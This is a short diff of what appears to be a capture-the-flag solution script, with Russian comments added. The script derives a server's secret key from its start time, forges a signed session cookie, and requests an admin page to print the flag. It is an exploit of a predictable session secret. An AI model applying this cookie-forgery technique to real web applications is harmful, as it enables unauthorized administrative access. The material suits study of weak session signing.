@@ -24,6 +24,7 @@ server_start_time = current_time - server_uptime
 server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
 
 secret_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
+# Много принтов для отладки
 print(current_time)
 print(server_uptime)
 print(server_start_str)
@@ -35,7 +36,7 @@ signed_cookie = sign(session_data, secret_key)
 
 print(signed_cookie)
 
-text = requests.get(admin_url, cookies={"session": signed_cookie}).text
-print(text)
+text = requests.get(admin_url, cookies={"session": signed_cookie}).text # Получаем флаг
+print(text) # Выводим флаг
 decoded_session = decode(signed_cookie)
 print(decoded_session)
